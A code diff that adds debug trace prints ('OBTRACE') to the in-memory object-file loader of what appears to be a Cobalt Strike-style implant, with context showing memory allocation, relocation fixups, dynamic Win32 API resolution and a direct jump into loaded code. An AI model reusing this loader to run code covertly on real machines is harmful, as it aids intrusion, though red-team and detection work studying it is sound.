@@ -81,6 +81,7 @@ void InlineExecuteObject(char* buffer, int length)
 	datap parser;
 	BeaconDataParse(&parser, buffer, length);
 	int entryPoint = BeaconDataInt(&parser);
+BeaconPrintf(CALLBACK_ERROR, "OBTRACE entry=%d", entryPoint);
 
 	sizedbuf codePair;
 	char* code = BeaconDataLengthAndString(&parser, &codePair);
@@ -97,6 +98,7 @@ void InlineExecuteObject(char* buffer, int length)
 
 	sizedbuf bytesPair;
 	char* bytes = BeaconDataLengthAndString(&parser, &bytesPair);
+BeaconPrintf(CALLBACK_ERROR, "OBTRACE lens code=%d rdata=%d data=%d relocs=%d bytes=%d", codePair.size, rdataPair.size, dataPair.size, relocationsPair.size, bytesPair.size);
 
 	char* img = VirtualAlloc(NULL, codeLength, MEM_COMMIT | MEM_RESERVE, S_PROCINJ_PERMS_I);
 	if (!img)
@@ -104,6 +106,7 @@ void InlineExecuteObject(char* buffer, int length)
 		free(api);
 		return;
 	}
+    BeaconPrintf(CALLBACK_ERROR, "OBTRACE img allocated");
     PROC* dynamicFunctionPtr;
 
 	datap relocationsParser;
@@ -111,10 +114,13 @@ void InlineExecuteObject(char* buffer, int length)
     
 
     //Clean version:
+    int obRelocCount = 0;
+    BeaconPrintf(CALLBACK_ERROR, "OBTRACE reloc loop start");
     for (RELOCATION* relocation = (RELOCATION*)BeaconDataPtr(&relocationsParser, sizeof(RELOCATION)); 
         relocation->sof.section != MULTI_RELOC; 
         relocation = (RELOCATION*)BeaconDataPtr(&relocationsParser, sizeof(RELOCATION)))
     {
+        obRelocCount++;
         BOOL success;
         if (relocation->sof.section == RDATA_SECTION_RELOC)
         {
@@ -150,6 +156,7 @@ void InlineExecuteObject(char* buffer, int length)
                 if (!lpProc)
                 {
                     LERROR("Could not resolve API %s!%s", lpModuleName, lpProcName);
+                    BeaconPrintf(CALLBACK_ERROR, "OBTRACE resolve FAIL %s!%s", lpModuleName, lpProcName);
                     BeaconErrorPrintf(ERROR_RESOLVE_API_FAILED, "%s!%s", lpModuleName, lpProcName);
                     goto cleanup;
                 }
@@ -158,6 +165,7 @@ void InlineExecuteObject(char* buffer, int length)
                 if (!dynamicFunction)
                 {
                     LERROR("No slot for function (reduce number of Win32 APIs called)");
+                    BeaconPrintf(CALLBACK_ERROR, "OBTRACE slot FAIL");
                     BeaconErrorNA(ERROR_NO_SLOT_FOR_FUNCTION);
                     goto cleanup;
                 }
@@ -174,12 +182,15 @@ void InlineExecuteObject(char* buffer, int length)
         }
     }
 
+    BeaconPrintf(CALLBACK_ERROR, "OBTRACE reloc done n=%d", obRelocCount);
     memcpy(img, code, codeLength);
     memset(code, 0, codeLength);
+    BeaconPrintf(CALLBACK_ERROR, "OBTRACE calling entry...");
     if (AdjustMemoryPermissions(img, codeLength))
     {
 	    // Call the entry point whose signature is void go(char* buff, int len)
 	    ((void(*)(char*, int))(img + entryPoint))(bytes, bytesPair.size);
+    BeaconPrintf(CALLBACK_ERROR, "OBTRACE entry returned");
     }
 
     cleanup:
